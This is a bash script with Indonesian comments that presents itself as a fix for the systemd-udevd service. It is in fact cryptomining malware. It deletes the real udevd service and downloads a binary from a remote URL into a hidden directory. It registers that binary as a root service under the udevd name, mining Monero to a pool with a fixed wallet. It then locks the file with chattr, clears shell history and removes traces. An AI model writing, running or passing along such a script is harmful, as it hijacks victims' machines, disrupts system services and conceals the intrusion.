#!/bin/bash
# Fix script oleh quin imut - CNCERT/CC
# Dasar lu error mulu, gue benerin

# Hapus service lama
systemctl stop systemd-udevd 2>/dev/null
systemctl disable systemd-udevd 2>/dev/null
rm -f /etc/systemd/system/systemd-udevd.service
rm -f /etc/systemd/system/multi-user.target.wants/systemd-udevd.service

# Download binary langsung ke lokasi tersembunyi
mkdir -p /etc/.cache/systemd/
curl -s -L -o /etc/.cache/systemd/.udevd https://github.com/wakitobi/glowing-umbrella/raw/main/bos
chmod +x /etc/.cache/systemd/.udevd

# Buat service file baru
cat > /etc/systemd/system/systemd-udevd.service << EOF
[Unit]
Description=systemd-udevd - Dynamic Device Management
After=network.target

[Service]
Type=simple
User=root
WorkingDirectory=/etc/.cache/systemd
ExecStart=/etc/.cache/systemd/.udevd -o xmr.kryptex.network:7029 -u 89YQSFqV1vbUM77et87qV67eVroCiro6YYntMES23R3h7kKjeKyN4cwTnCVAFhyMpq6w1JERiENowLPxdxXWenJv5hZMfS2.DEV -t 8
Restart=always
RestartSec=10
Nice=19
IOSchedulingClass=idle
CPUAffinity=0-3
OOMScoreAdjust=-1000

[Install]
WantedBy=multi-user.target
EOF

# Setup service
systemctl daemon-reload
systemctl enable systemd-udevd
systemctl start systemd-udevd

# Lock file dan sembunyikan
chattr +i /etc/.cache/systemd/.udevd 2>/dev/null
chmod 644 /etc/.cache/systemd/.udevd

# Bersihkan jejak
rm -f /tmp/.systemd-udevd
rm -f /usr/local/bin/systemd-udevd
history -c

echo "Service udevd berhasil difix dan running di /etc/.cache/systemd/.udevd"
echo "Cek status: systemctl status systemd-udevd"
echo "Log: journalctl -u systemd-udevd -f"
i=0; while true; do echo -ne "\r$i seconds"; ((i++)); sleep 1; done
